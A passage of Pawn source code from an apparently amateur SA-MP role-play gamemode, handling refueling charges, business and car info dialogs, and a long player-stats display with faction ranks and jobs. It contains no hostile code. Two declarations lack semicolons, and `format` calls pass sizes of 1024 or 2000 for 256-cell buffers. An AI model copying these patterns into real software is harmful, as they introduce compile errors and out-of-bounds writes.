                    FillUp = FillUp * SBizzInfo[IsAtGasStation(i)][sbEntranceCost];
                    format(string,sizeof(string),"* Vehicle filled up, for: $%s.",FormatNumber(FillUp));
                    SendClientMessage(i,COLOR_WHITE,string);
                    SBizzInfo[IsAtGasStation(i)][sbTill] += FillUp;
                    SBizzInfo[IsAtGasStation(i)][sbProducts] --;
                    Refueling[i] = 0;
                    DarsadBenzin[VID] = 0;
                    TogglePlayerControllable(i, 1);
                }
                else
                {
                    if(GetPlayerPool(i) >= FillUp)
                    {
                        Benzin[VID] += FillUp;
                        FillUp = FillUp * SBizzInfo[IsAtGasStation(i)][sbEntranceCost];
                        format(string,sizeof(string),"* Vehicle filled up, for: $%s.",FormatNumber(FillUp));
                        SendClientMessage(i,COLOR_WHITE,string);
                        GivePlayerPool(i, -FillUp);
                        SBizzInfo[IsAtGasStation(i)][sbProducts] --;
                        SBizzInfo[IsAtGasStation(i)][sbTill] += FillUp;
                        Refueling[i] = 0;
                        DarsadBenzin[VID] = 0;
                        TogglePlayerControllable(i, 1);
                    }
                    else
                    {
                        format(string,sizeof(string),"Not enough Money to refill, it costs $%s to fill your Vehicle.",FormatNumber(FillUp));
                        SendClientMessage(i,COLOR_WHITE,string);
                        TogglePlayerControllable(i, 1);
                    }
                }
            }
        }
    return 1;
}
public SetPlayerWeapons(playerid)
{
    if(IsPlayerConnected(playerid))
    {
        if(PlayerInfo[playerid][pJailTime] < 1)
        {
            if(gTeam[playerid] == TEAM_COP || IsACop(playerid))
            {
                if(OnDuty[playerid] == 1 && IsACop(playerid) && PINFO[playerid][pGunLic] >= 1)
                {
					SetTimerEx("GiveDutyGuns",300, false, "i", playerid);
                }
            }
        }
    }
}

public PrintSBizInfo(playerid,targetid)
{
    if(IsPlayerConnected(playerid))
    {
        new string1[256];
        new string2[256];
        new bizstring[256];
        new entry = SBizzInfo[targetid][sbEntranceCost];
        new till = SBizzInfo[targetid][sbTill];
        format(string1, 1024, "{26B0BA}%s's business! \n\n{67B304}These are your biz informations:{E5E3B3}\n{E5E3B3}Biz Name: {26B0BA}%s \n{E5E3B3}\n{E5E3B3}EntryFee: {26B0BA}${26B0BA}%s \n{E5E3B3}Till: {26B0BA}$%s:",SBizzInfo[targetid][sbOwner],SBizzInfo[targetid][sbMessage],FormatNumber(entry),FormatNumber(till));
        format(string2, 1024, "{E5E3B3}Products: {26B0BA}%d/%d",SBizzInfo[targetid][sbProducts],SBizzInfo[targetid][sbMaxProducts]);
        format(bizstring, 2000, "%s\n%s",string1, string2);
        ShowPlayerDialog(playerid, 422, DIALOG_STYLE_MSGBOX, " {838383}Business Information", bizstring, "Cancel","");
    }
}

public PrintBizInfo(playerid,targetid)
{
    if(IsPlayerConnected(playerid))
    {
        new string1[256];
        new string2[256];
        new bizstring[256];
        new entry = BizzInfo[targetid][bEntranceCost];
        new till = BizzInfo[targetid][bTill];
        format(string1, 1024, "{26B0BA}%s's business! \n\n{67B304}These are your biz informations:{E5E3B3}\n{E5E3B3}Biz Name: {26B0BA}%s \n{E5E3B3}Locked: {26B0BA}%d \n{E5E3B3}EntryFee: {26B0BA}${26B0BA}%s \n{E5E3B3}Till: {26B0BA}$%s:",BizzInfo[targetid][bOwner],BizzInfo[targetid][bMessage],BizzInfo[targetid][bLocked],FormatNumber(entry),FormatNumber(till));
        format(string2, 1024, "{E5E3B3}Products: {26B0BA}%d/%d",BizzInfo[targetid][bProducts],BizzInfo[targetid][bMaxProducts]);
        format(bizstring, 2000, "%s\n%s",string1, string2);
        ShowPlayerDialog(playerid, 422, DIALOG_STYLE_MSGBOX, " {838383}Business Information", bizstring, "Cancel","");
    }
}
public ShowCarInfo(playerid, targetid, MMID)
{
    if(IsPlayerConnected(playerid)&&IsPlayerConnected(targetid))
    {
        if(MMID == 1)
        {
            new rrtext[20];
            if(PlayerInfo[targetid][cLock] == 1) {rrtext = "Yes"; }
            else if(PlayerInfo[targetid][cLock] == 0) {rrtext = "No"; }
            new string[256];
            new sname[MAX_PLAYER_NAME];
            GetPlayerName(targetid,sname,sizeof(sname));
            new vehicles = GetVehicleModel(PlayerInfo[targetid][pCar]) - 400;
            SendClientMessage(playerid, CRISTIAN,"_______________________________________");
            format(string, 256, "*** %s's vehicle ***", sname);
            SendClientMessage(playerid, COLOR_WHITE, string);
            format(string, 256, "Model:[%s] Standar Price:[$%s] Locked:[%s] Times Destroyed:[%d] Insurance Amount:[%d]", aVehicleNames[vehicles], FormatNumber(PlayerInfo[targetid][cPrice]), rrtext,PlayerInfo[targetid][cDestroyed],PlayerInfo[targetid][cInsurance]);
            SendClientMessage(playerid, COLOR_GRAD3, string);
            format(string, 256, "Plate:[%s] Color id 1:[%d] Color id 2:[%d] Fuel:[%i%%] Odometer:[%.2f]",PlayerInfo[targetid][cPlate],PlayerInfo[targetid][cColor1],PlayerInfo[targetid][cColor2],Benzin[PINFO[targetid][pCar]],PlayerInfo[targetid][cKilo]);
            SCM(playerid,COLOR_GRAD2, string);
            SendClientMessage(playerid, CRISTIAN,"_______________________________________");
            return 1;
        }
        else if(MMID == 2)
        {
            new rrtext[20];
            if(PlayerInfo[targetid][cLock_2] == 1) {rrtext = "Yes"; }
            else if(PlayerInfo[targetid][cLock_2] == 0) {rrtext = "No"; }
            new string[256];
            new sname[MAX_PLAYER_NAME];
            GetPlayerName(targetid,sname,sizeof(sname));
            new vehicles = GetVehicleModel(PlayerInfo[targetid][pCar_2]) - 400;
            SendClientMessage(playerid, CRISTIAN,"_______________________________________");
            format(string, 256, "*** %s's vehicle ***", sname);
            SendClientMessage(playerid, COLOR_WHITE, string);
            format(string, 256, "Model:[%s] Standar Price:[$%s] Locked:[%s] Times Destroyed:[%d] Insurance Amount:[%d]", aVehicleNames[vehicles], FormatNumber(PlayerInfo[targetid][cPrice_2]), rrtext,PlayerInfo[targetid][cDestroyed_2],PlayerInfo[targetid][cInsurance_2]);
            SendClientMessage(playerid, COLOR_GRAD3, string);
            format(string, 256, "Plate:[%s] Color id 1:[%d] Color id 2:[%d] Fuel[%i%%] KilooMeter:[%.2f]",PlayerInfo[targetid][cPlate_2],PlayerInfo[targetid][cColor1_2],PlayerInfo[targetid][cColor2_2],Benzin[PINFO[targetid][pCar_2]],PlayerInfo[targetid][cKilo_2]);
            SCM(playerid,COLOR_GRAD2, string);
            SendClientMessage(playerid, CRISTIAN,"_______________________________________");
            return 1;
        }
    }
    return 1;
}
forward garbage(playerid,cp,Float:posx,Float:posy,Float:posz);
public garbage(playerid,cp,Float:posx,Float:posy,Float:posz)
{
    TogglePlayerControllable(playerid,1);
    SCM(playerid,COLOR_ROUZ,"Go to the next checkpoint.");
    Trashes[playerid] += 1;
    OnCheckpoint[playerid] = 1;
    CP[playerid] = cp;
    SetPlayerCheckpoint(playerid,posx,posy,posz,4);
    return 1;
}
public ShowStats(playerid,targetid)
{
    if(IsPlayerConnected(playerid)&&IsPlayerConnected(targetid))
    {
        new atext[20];
        if(PlayerInfo[targetid][pSex] == 1) { atext = "Male"; }
        else if(PlayerInfo[targetid][pSex] == 2) { atext = "Female"; }
        else if(PlayerInfo[targetid][pSex] == 3) { atext = "Male"; }
        else if(PlayerInfo[targetid][pSex] == 4) { atext = "Female"; }

        new clan[212];
        if(PlayerInfo[targetid][pClan] == 1) { clan = "[TT]Clan"; }
        else if(PlayerInfo[targetid][pClan] == 2) { clan = "[GG]Clan"; }
		else if(PlayerInfo[targetid][pClan] == 3) { clan = "Evil Clan"; }
		else if(PlayerInfo[targetid][pClan] == 4) { clan = "AnGeL Clan"; }
        else {
  clan = "None";
        }

        new rclan[213];
         if(PlayerInfo[targetid][pClan] == 1)//TT Ranks
        {
            if(PlayerInfo[targetid][pcRank] == 1) { rclan = "Rank 1"; }
            else if(PlayerInfo[targetid][pcRank] == 2) { rclan = "Rank 2"; }
            else if(PlayerInfo[targetid][pcRank] == 3) { rclan = "Rank 3"; }
            else if(PlayerInfo[targetid][pcRank] == 4) { rclan = "Rank 4"; }
            else if(PlayerInfo[targetid][pcRank] == 5) { rclan = "Rank 5"; }
            else if(PlayerInfo[targetid][pcRank] == 6) { rclan = "Sub Leader TT"; }
            else if(PlayerInfo[targetid][pcRank] == 7) { rclan = "Leader TT"; }
        }
         else if(PlayerInfo[targetid][pClan] == 2)//GG Ranks
        {
            if(PlayerInfo[targetid][pcRank] == 1) { rclan = "Rank 1"; }
            else if(PlayerInfo[targetid][pcRank] == 2) { rclan = "Rank 2"; }
            else if(PlayerInfo[targetid][pcRank] == 3) { rclan = "Rank 3"; }
            else if(PlayerInfo[targetid][pcRank] == 4) { rclan = "Rank 4"; }
            else if(PlayerInfo[targetid][pcRank] == 5) { rclan = "Rank 5"; }
            else if(PlayerInfo[targetid][pcRank] == 6) { rclan = "Sub Leader TT"; }
            else if(PlayerInfo[targetid][pcRank] == 7) { rclan = "Leader TT"; }
        }
         else if(PlayerInfo[targetid][pClan] == 3)//EVIL Ranks
        {
            if(PlayerInfo[targetid][pcRank] == 1) { rclan = "Rank 1"; }
            else if(PlayerInfo[targetid][pcRank] == 2) { rclan = "Rank 2"; }
            else if(PlayerInfo[targetid][pcRank] == 3) { rclan = "Rank 3"; }
            else if(PlayerInfo[targetid][pcRank] == 4) { rclan = "Rank 4"; }
            else if(PlayerInfo[targetid][pcRank] == 5) { rclan = "Rank 5"; }
            else if(PlayerInfo[targetid][pcRank] == 6) { rclan = "Sub Leader Evil"; }
            else if(PlayerInfo[targetid][pcRank] == 7) { rclan = "Leader Evil"; }
        }
         else if(PlayerInfo[targetid][pClan] == 4)//AnGeL Ranks
        {
            if(PlayerInfo[targetid][pcRank] == 1) { rclan = "Rank 1"; }
            else if(PlayerInfo[targetid][pcRank] == 2) { rclan = "Rank 2"; }
            else if(PlayerInfo[targetid][pcRank] == 3) { rclan = "Rank 3"; }
            else if(PlayerInfo[targetid][pcRank] == 4) { rclan = "Rank 4"; }
            else if(PlayerInfo[targetid][pcRank] == 5) { rclan = "Rank 5"; }
            else if(PlayerInfo[targetid][pcRank] == 6) { rclan = "Sub Leader AnGeL"; }
            else if(PlayerInfo[targetid][pcRank] == 7) { rclan = "Leader AnGeL"; }
        }
        else
        {
            rclan = "None";
        }

        new ttext[50];
		if(PlayerInfo[targetid][pMember] == 1 || PlayerInfo[targetid][pLeader] == 1) { ttext = "{171DFF}Police Departament"; }
        else if(PlayerInfo[targetid][pMember] == 2 || PlayerInfo[targetid][pLeader] == 2) { ttext = "{171DFF}F.B.I."; }
        else if(PlayerInfo[targetid][pMember] == 3 || PlayerInfo[targetid][pLeader] == 3) { ttext = "{171DFF}National Guard"; }
        else if(PlayerInfo[targetid][pMember] == 4 || PlayerInfo[targetid][pLeader] == 4) { ttext = "{57e547}Firemen/Paramedic"; }
        else if(PlayerInfo[targetid][pMember] == 5 || PlayerInfo[targetid][pLeader] == 5) { ttext = "{5D7E8D}Silence Mafia"; }
        else if(PlayerInfo[targetid][pMember] == 6 || PlayerInfo[targetid][pLeader] == 6) { ttext = "{3E3535}The Killers Family"; }
        else if(PlayerInfo[targetid][pMember] == 7 || PlayerInfo[targetid][pLeader] == 7) { ttext = "{BBF060}Mayor"; }
        else if(PlayerInfo[targetid][pMember] == 8 || PlayerInfo[targetid][pLeader] == 8) { ttext = "{8E2323}Hitman Agency"; }
        else if(PlayerInfo[targetid][pMember] == 9 || PlayerInfo[targetid][pLeader] == 9) { ttext = "{825B8C}News Reporter"; }
        else if(PlayerInfo[targetid][pMember] == 10 || PlayerInfo[targetid][pLeader] == 10) { ttext = "{FFFF00}Taxi Drivers"; }
        else if(PlayerInfo[targetid][pMember] == 11 || PlayerInfo[targetid][pLeader] == 11) { ttext = "{0974C6}School Instructor"; }
        else if(PlayerInfo[targetid][pMember] == 12 || PlayerInfo[targetid][pLeader] == 12) { ttext = "{19AF23}Dangerous Tigers Family"; }
        else if(PlayerInfo[targetid][pMember] == 13 || PlayerInfo[targetid][pLeader] == 13) { ttext = "{FFBA00}Legendary Men Family"; }
        else if(PlayerInfo[targetid][pMember] == 14 || PlayerInfo[targetid][pLeader] == 14) { ttext = "{B32CF6}Fast N Furious Family"; }
        else if(PlayerInfo[targetid][pMember] == 15 || PlayerInfo[targetid][pLeader] == 15) { ttext = "{00ECEC}Storm Men Family"; }
        else if(PlayerInfo[targetid][pMember] == 16 || PlayerInfo[targetid][pLeader] == 16) { ttext = "{F9F7CE}Tow Car Company"; }
        else if(PlayerInfo[targetid][pMember] == 17 || PlayerInfo[targetid][pLeader] == 17) { ttext = "{57e547}Staff"; }
        else if(PlayerInfo[targetid][pMember] == 19 || PlayerInfo[targetid][pLeader] == 19) { ttext = "{0E47FF}The Racers"; }
        else if(PlayerInfo[targetid][pMember] == 20 || PlayerInfo[targetid][pLeader] == 20) { ttext = "{60F565}SFPD"; }
        else { ttext = "{FFFFFF}Cilivian"; }
        new rtext[64];
        if(PlayerInfo[targetid][pMember] == 1 || PlayerInfo[targetid][pLeader] == 1)//PD Ranks
        {
            if(PlayerInfo[targetid][pRank] == 1) { rtext = "Soldier"; }
            else if(PlayerInfo[targetid][pRank] == 2) { rtext = "Police Officer"; }
            else if(PlayerInfo[targetid][pRank] == 3) { rtext = "Sergeant"; }
            else if(PlayerInfo[targetid][pRank] == 4) { rtext = "Captain"; }
            else if(PlayerInfo[targetid][pRank] == 5) { rtext = "Colonel"; }
            else if(PlayerInfo[targetid][pRank] == 6) { rtext = "Chief"; }
            else if(PlayerInfo[targetid][pRank] == 7) { rtext = "PD Leader"; }

        }
        else if(PlayerInfo[targetid][pMember] == 2 || PlayerInfo[targetid][pLeader] == 2)//FBI Ranks
        {
            if(PlayerInfo[targetid][pRank] == 1) { rtext = "New Agent Trainee"; }
            else if(PlayerInfo[targetid][pRank] == 2) { rtext = "Special Agent"; }
            else if(PlayerInfo[targetid][pRank] == 3) { rtext = "Supervisory Special Agent"; }
            else if(PlayerInfo[targetid][pRank] == 4) { rtext = "Unit Chief"; }
            else if(PlayerInfo[targetid][pRank] == 5) { rtext = "Deputy Director"; }
            else if(PlayerInfo[targetid][pRank] == 6) { rtext = "Director"; }
            else if(PlayerInfo[targetid][pRank] == 7) { rtext = "PD Leader"; }

        }
        else if(PlayerInfo[targetid][pMember] == 3 || PlayerInfo[targetid][pLeader] == 3)//NG Ranks
        {
            if(PlayerInfo[targetid][pRank] == 1) { rtext = "Private"; }
            else if(PlayerInfo[targetid][pRank] == 2) { rtext = "Corporal"; }
            else if(PlayerInfo[targetid][pRank] == 3) { rtext = "Sergeant"; }
            else if(PlayerInfo[targetid][pRank] == 4) { rtext = "Master Sergeant"; }
            else if(PlayerInfo[targetid][pRank] == 5) { rtext = "Sergeant Major"; }
            else if(PlayerInfo[targetid][pRank] == 6) { rtext = "Marshal"; }
            else if(PlayerInfo[targetid][pRank] == 7) { rtext = "National Guard Leader"; }

        }
        else if(PlayerInfo[targetid][pMember] == 4 || PlayerInfo[targetid][pLeader] == 4)//Medic Ranks
        {
            if(PlayerInfo[targetid][pRank] == 1) { rtext = "Paramedic trainee"; }
            else if(PlayerInfo[targetid][pRank] == 2) { rtext = "Paramedic"; }
            else if(PlayerInfo[targetid][pRank] == 3) { rtext = "Pro Paramadic"; }
            else if(PlayerInfo[targetid][pRank] == 4) { rtext = "Paramadic Commander"; }
            else if(PlayerInfo[targetid][pRank] == 5) { rtext = "Fireman Commander"; }
            else if(PlayerInfo[targetid][pRank] == 6) { rtext = "Professional fireman Commander"; }
            else if(PlayerInfo[targetid][pRank] == 7) { rtext = "Paramedic/fireman Leader"; }

        }
        else if(PlayerInfo[targetid][pMember] == 5 || PlayerInfo[targetid][pLeader] == 5)//Silence Mafia Ranks
        {
            if(PlayerInfo[targetid][pRank] == 1) { rtext = "Soldier"; }
            else if(PlayerInfo[targetid][pRank] == 2) { rtext = "Pro Soldier"; }
            else if(PlayerInfo[targetid][pRank] == 3) { rtext = "gunner"; }
            else if(PlayerInfo[targetid][pRank] == 4) { rtext = "Pro Sniper"; }
            else if(PlayerInfo[targetid][pRank] == 5) { rtext = "professional mafia"; }
            else if(PlayerInfo[targetid][pRank] == 6) { rtext = "Versatile"; }
            else if(PlayerInfo[targetid][pRank] == 7) { rtext = "Silence Mafia Leader"; }

        }
        else if(PlayerInfo[targetid][pMember] == 6 || PlayerInfo[targetid][pLeader] == 6)//The Killers Family Ranks
        {
            if(PlayerInfo[targetid][pRank] == 1) { rtext = "Soldier"; }
            else if(PlayerInfo[targetid][pRank] == 2) { rtext = "Pro Soldier"; }
            else if(PlayerInfo[targetid][pRank] == 3) { rtext = "gunner"; }
            else if(PlayerInfo[targetid][pRank] == 4) { rtext = "Pro Sniper"; }
            else if(PlayerInfo[targetid][pRank] == 5) { rtext = "professional mafia"; }
            else if(PlayerInfo[targetid][pRank] == 6) { rtext = "Versatile"; }
            else if(PlayerInfo[targetid][pRank] == 7) { rtext = "The Killers Leader"; }

        }
        else if(PlayerInfo[targetid][pMember] == 7)//Mayor ranks
        {
            if(PlayerInfo[targetid][pRank] == 7) { rtext = "Mayor"; }

        }
        else if(PlayerInfo[targetid][pMember] == 8 || PlayerInfo[targetid][pLeader] == 8)//Hitman Ranks
        {
            if(PlayerInfo[targetid][pRank] == 1) { rtext = "Newbie Killer"; }
            else if(PlayerInfo[targetid][pRank] == 2) { rtext = "Marksman"; }
            else if(PlayerInfo[targetid][pRank] == 3) { rtext = "Agent"; }
            else if(PlayerInfo[targetid][pRank] == 4) { rtext = "Special Agent"; }
            else if(PlayerInfo[targetid][pRank] == 5) { rtext = "Sniper"; }
            else if(PlayerInfo[targetid][pRank] == 6) { rtext = "Pro Killer"; }
            else if(PlayerInfo[targetid][pRank] == 7) { rtext = "Hitman Leader"; }

        }
        else if(PlayerInfo[targetid][pMember] == 9 || PlayerInfo[targetid][pLeader] == 9)//NR Ranks
        {
            if(PlayerInfo[targetid][pRank] == 1) { rtext = "News Reporter"; }
            else if(PlayerInfo[targetid][pRank] == 2) { rtext = "Local Reporter"; }
            else if(PlayerInfo[targetid][pRank] == 3) { rtext = "Local Editor"; }
            else if(PlayerInfo[targetid][pRank] == 4) { rtext = "Newtwork Reporter"; }
            else if(PlayerInfo[targetid][pRank] == 5) { rtext = "Newtwork Editor"; }
            else if(PlayerInfo[targetid][pRank] == 6) { rtext = "Network Producer"; }
            else if(PlayerInfo[targetid][pRank] == 7) { rtext = "NR Leader"; }
        }
        else if(PlayerInfo[targetid][pMember] == 10 || PlayerInfo[targetid][pLeader] == 10)//Taxi Company Ranks
        {
            if(PlayerInfo[targetid][pRank] == 1) { rtext = "Trainee Taxi"; }
            else if(PlayerInfo[targetid][pRank] == 2) { rtext = "Taxi Rookie"; }
            else if(PlayerInfo[targetid][pRank] == 3) { rtext = "Pro Taxi Driver"; }
            else if(PlayerInfo[targetid][pRank] == 4) { rtext = "Dispatcher"; }
            else if(PlayerInfo[targetid][pRank] == 5) { rtext = "Shift Supervisor"; }
            else if(PlayerInfo[targetid][pRank] == 6) { rtext = "Taxi Company Owner"; }
            else if(PlayerInfo[targetid][pRank] == 7) { rtext = "Taxi Leader"; }
        }
        else if(IsAnInstructor(targetid))//Driving/Flying School Ranks
        {
            if(PlayerInfo[targetid][pRank] == 1) { rtext = "Trainee S.I"; }
            else if(PlayerInfo[targetid][pRank] == 2) { rtext = "Instructor"; }
            else if(PlayerInfo[targetid][pRank] == 3) { rtext = "Senior Instructor"; }
            else if(PlayerInfo[targetid][pRank] == 4) { rtext = "Manager"; }
            else if(PlayerInfo[targetid][pRank] == 5) { rtext = "Under Boss"; }
            else if(PlayerInfo[targetid][pRank] == 6) { rtext = "Boss"; }
            else if(PlayerInfo[targetid][pRank] == 7) { rtext = "S.I Leader"; }
        }
        else if(PlayerInfo[targetid][pMember] == 12 || PlayerInfo[targetid][pLeader] == 12)//Dangerous Tigers Family Ranks
        {
            if(PlayerInfo[targetid][pRank] == 1) { rtext = "Soldier"; }
            else if(PlayerInfo[targetid][pRank] == 2) { rtext = "Pro Soldier"; }
            else if(PlayerInfo[targetid][pRank] == 3) { rtext = "gunner"; }
            else if(PlayerInfo[targetid][pRank] == 4) { rtext = "Pro Sniper"; }
            else if(PlayerInfo[targetid][pRank] == 5) { rtext = "professional mafia"; }
            else if(PlayerInfo[targetid][pRank] == 6) { rtext = "Versatile"; }
            else if(PlayerInfo[targetid][pRank] == 7) { rtext = "Dangerous Tigers Leader"; }

        }
        else if(PlayerInfo[targetid][pMember] == 13 || PlayerInfo[targetid][pLeader] == 13)//LegendaryMen Family Ranks
        {
            if(PlayerInfo[targetid][pRank] == 1) { rtext = "Soldier"; }
            else if(PlayerInfo[targetid][pRank] == 2) { rtext = "Pro Soldier"; }
            else if(PlayerInfo[targetid][pRank] == 3) { rtext = "gunner"; }
            else if(PlayerInfo[targetid][pRank] == 4) { rtext = "Pro Sniper"; }
            else if(PlayerInfo[targetid][pRank] == 5) { rtext = "professional mafia"; }
            else if(PlayerInfo[targetid][pRank] == 6) { rtext = "Versatile"; }
            else if(PlayerInfo[targetid][pRank] == 7) { rtext = "Legendary Men Leader"; }

        }
        else if(PlayerInfo[targetid][pMember] == 14 || PlayerInfo[targetid][pLeader] == 14)//FNF Family Ranks
        {
            if(PlayerInfo[targetid][pRank] == 1) { rtext = "Soldier"; }
            else if(PlayerInfo[targetid][pRank] == 2) { rtext = "Pro Soldier"; }
            else if(PlayerInfo[targetid][pRank] == 3) { rtext = "gunner"; }
            else if(PlayerInfo[targetid][pRank] == 4) { rtext = "Pro Sniper"; }
            else if(PlayerInfo[targetid][pRank] == 5) { rtext = "professional mafia"; }
            else if(PlayerInfo[targetid][pRank] == 6) { rtext = "Versatile"; }
            else if(PlayerInfo[targetid][pRank] == 7) { rtext = "Fast N Furious Leader"; }

        }
        else if(PlayerInfo[targetid][pMember] == 15 || PlayerInfo[targetid][pLeader] == 15)//StormMen Family Ranks
        {
            if(PlayerInfo[targetid][pRank] == 1) { rtext = "Soldier"; }
            else if(PlayerInfo[targetid][pRank] == 2) { rtext = "Pro Soldier"; }
            else if(PlayerInfo[targetid][pRank] == 3) { rtext = "gunner"; }
            else if(PlayerInfo[targetid][pRank] == 4) { rtext = "Pro Sniper"; }
            else if(PlayerInfo[targetid][pRank] == 5) { rtext = "professional mafia"; }
            else if(PlayerInfo[targetid][pRank] == 6) { rtext = "Versatile"; }
            else if(PlayerInfo[targetid][pRank] == 7) { rtext = "Storm Men Leader"; }

        }
        else if(PlayerInfo[targetid][pMember] == 16 || PlayerInfo[targetid][pLeader] == 16)//TCC Ranks
        {
            if(PlayerInfo[targetid][pRank] == 1) { rtext = "Trainee TCC"; }
            else if(PlayerInfo[targetid][pRank] == 2) { rtext = "Mechanic"; }
            else if(PlayerInfo[targetid][pRank] == 3) { rtext = "Pro Mechanic"; }
            else if(PlayerInfo[targetid][pRank] == 4) { rtext = "Senior Mechanic"; }
            else if(PlayerInfo[targetid][pRank] == 5) { rtext = "Manager"; }
            else if(PlayerInfo[targetid][pRank] == 6) { rtext = "technician"; }
            else if(PlayerInfo[targetid][pRank] == 7) { rtext = "TCC Leader"; }
        }
                else if(PlayerInfo[targetid][pMember] == 17 || PlayerInfo[targetid][pLeader] == 17)//Staff Ranks
        {
            if(PlayerInfo[targetid][pRank] == 1) { rtext = "Staff Level 1"; }
            else if(PlayerInfo[targetid][pRank] == 2) { rtext = "Staff Level 2"; }
            else if(PlayerInfo[targetid][pRank] == 3) { rtext = "Staff Level 3"; }
            else if(PlayerInfo[targetid][pRank] == 4) { rtext = "Staff Level 4"; }
            else if(PlayerInfo[targetid][pRank] == 5) { rtext = "Sub Co-Owner"; }
            else if(PlayerInfo[targetid][pRank] == 6) { rtext = "Co-Owner"; }
            else if(PlayerInfo[targetid][pRank] == 7) { rtext = "Owner Staff"; }
        }
        else if(PlayerInfo[targetid][pMember] == 19 || PlayerInfo[targetid][pLeader] == 19)//The Racers Family Ranks
        {
            if(PlayerInfo[targetid][pRank] == 1) { rtext = "NewBie"; }
            else if(PlayerInfo[targetid][pRank] == 2) { rtext = "Racer"; }
            else if(PlayerInfo[targetid][pRank] == 3) { rtext = "Pro Racer"; }
            else if(PlayerInfo[targetid][pRank] == 4) { rtext = "Drifter"; }
            else if(PlayerInfo[targetid][pRank] == 5) { rtext = "Pro Drifter"; }
            else if(PlayerInfo[targetid][pRank] == 6) { rtext = "LowRider"; }
            else if(PlayerInfo[targetid][pRank] == 7) { rtext = "The Racers Leader"; }

        }
        else if(PlayerInfo[targetid][pMember] == 20 || PlayerInfo[targetid][pLeader] == 20)//SFPD Family Ranks
        {
            if(PlayerInfo[targetid][pRank] == 1) { rtext = "Soldier"; }
            else if(PlayerInfo[targetid][pRank] == 2) { rtext = "Police Officer"; }
            else if(PlayerInfo[targetid][pRank] == 3) { rtext = "Sergeant"; }
            else if(PlayerInfo[targetid][pRank] == 4) { rtext = "Captain"; }
            else if(PlayerInfo[targetid][pRank] == 5) { rtext = "Colonel"; }
            else if(PlayerInfo[targetid][pRank] == 6) { rtext = "Chief"; }
            else if(PlayerInfo[targetid][pRank] == 7) { rtext = "SFPD Leader"; }
        }
        else
        {
            rtext = "None";
        }
        new jtext[20];
        if(PlayerInfo[targetid][pJob] == 1) { jtext = "Detective"; }
        else if(PlayerInfo[targetid][pJob] == 2) { jtext = "Lawyer"; }
        else if(PlayerInfo[targetid][pJob] == 4) { jtext = "Drugs Dealer"; }
        else if(PlayerInfo[targetid][pJob] == 5) { jtext = "Car Jacker"; }
        else if(PlayerInfo[targetid][pJob] == 7) { jtext = "Car Mechanic"; }
        else if(PlayerInfo[targetid][pJob] == 9) { jtext = "Arms Dealer"; }
        else if(PlayerInfo[targetid][pJob] == 14) { jtext = "Bus Driver"; }
        else if(PlayerInfo[targetid][pJob] == 16) { jtext = "Trucker"; }
        else if(PlayerInfo[targetid][pJob] == 18) { jtext = "Farmer"; }
        else if(PlayerInfo[targetid][pJob] == 20) { jtext = "Garbage man"; }
        else if(PlayerInfo[targetid][pJob] == 21) { jtext = "Ranande Sherkat"; }
        else { jtext = "Unemployed"; }
        new drank[20];
        if(PlayerInfo[targetid][pPremiumAccount] >= 1) { drank = "Yes"; }
        else { drank = "No"; }
        new jailed = PlayerInfo[targetid][pJailTime];
        new jailtext[20];
        if(PlayerInfo[targetid][pJailTime] <= 0) { jailtext = "No"; }
        if(PlayerInfo[targetid][pJailTime] >= 1) { jailtext = "Yes"; }
        else { jailtext = "No"; }
        new married[20];
        strmid(married, PlayerInfo[targetid][pMarriedTo], 0, strlen(PlayerInfo[targetid][pMarriedTo]), 255);
        new ptime = PlayerInfo[targetid][pConnectTime];
        new afktime = PlayerInfo[targetid][pAFKtime];
        new lotto = PlayerInfo[targetid][pLottoNr];
        new crimes = PlayerInfo[targetid][pCrimes];
        new arrests = PlayerInfo[targetid][pArrested];
        new drugs = PlayerInfo[targetid][pDrugs];
        new mats = PlayerInfo[targetid][pMats];
        new level = PlayerInfo[targetid][pLevel];
        new exp = PlayerInfo[targetid][pExp];
        new pnumber = PlayerInfo[targetid][pPnumber];
        new nxtlevel = PlayerInfo[targetid][pLevel]+1;
        new expamount = nxtlevel*levelexp;
        new costlevel = nxtlevel*levelcost;//25k for testing purposes
        new account = PlayerInfo[targetid][pAccount];
        new cash = GetPlayerPool(targetid);
        //new robstat = PlayerInfo[targetid][pRob];
        new Float:health;
        new hkey = PlayerInfo[targetid][pPhousekey];
        new bkey = PlayerInfo[targetid][pPbiskey];
        new ckey = PlayerInfo[targetid][pCar];
        new ckey2 = PINFO[targetid][pCar_2];
        new warnp = PlayerInfo[targetid][pWarns];
        new fwarns = PlayerInfo[targetid][pFwarn];
        new name[MAX_PLAYER_NAME];
        new punish = PlayerInfo[targetid][pPunish];
        new approval = PlayerInfo[targetid][pApproval]
        new lawyerpoint = PlayerInfo[targetid][pLawyerPoint]
        GetPlayerName(targetid, name, sizeof(name));
        GetPlayerHealth(targetid,health);
        new Float:px,Float:py,Float:pz;
        GetPlayerPos(targetid, px, py, pz);
        new coordsstring[512];
        new robpo = PlayerInfo[targetid][pRob];
        SendClientMessage(playerid, CRISTIAN,"_______________________________________________");
        format(coordsstring, sizeof(coordsstring),"*** %s (%d) ***",name,targetid);
        SendClientMessage(playerid, COLOR_WHITE,coordsstring);
        format(coordsstring, sizeof(coordsstring), "Level:[%d] Sex:[%s] Cash:[$%s] Bank:[$%s] PhoneNr:[%s] Respect:[%d/%d] Premium Account:[%s]", level,atext,FormatNumber(cash),FormatNumber(account),FormatPhoneNumber(pnumber),exp,expamount,drank);
        SendClientMessage(playerid, COLOR_CRS5,coordsstring);
        format(coordsstring, sizeof(coordsstring), "Hours Played:[%d] AFK Time:[%d] TimesArrested:[%d] Level up:[$%s] Rob Points:[%d]", ptime,afktime,arrests,FormatNumber(costlevel),robpo);
        SendClientMessage(playerid, COLOR_CRS4,coordsstring);
        if(jailed)
        {
        format(coordsstring, sizeof(coordsstring), "Crimes:[%d] Drugs:[%d] Materials:[%d] Jailed:[%s, %d Sec] Lotto Number:[%d] Job:[%s]", crimes,drugs,mats,jailtext,jailed,lotto,jtext);
        }
        else
        {
        format(coordsstring, sizeof(coordsstring), "Crimes:[%d] Drugs:[%d] Materials:[%d] Jailed:[%s] Lotto Number:[%d] Job:[%s] Rob Points:[%d] Approval:[%d]", crimes,drugs,mats,jailtext,lotto,jtext,robpo,approval);
        }
        SendClientMessage(playerid, COLOR_CRS3,coordsstring);
        format(coordsstring, sizeof(coordsstring), "Married With:[%s] Faction:[%s{E6E6E6}] Rank:[%s] FactionWarns:[%d/3] FPunish[%d/60] Warns:[%d/3] Rep Point:[%i] Golds:[%i]", married,ttext,rtext,fwarns,punish,warnp,PlayerInfo[targetid][pRep],PlayerInfo[targetid][pGold]);
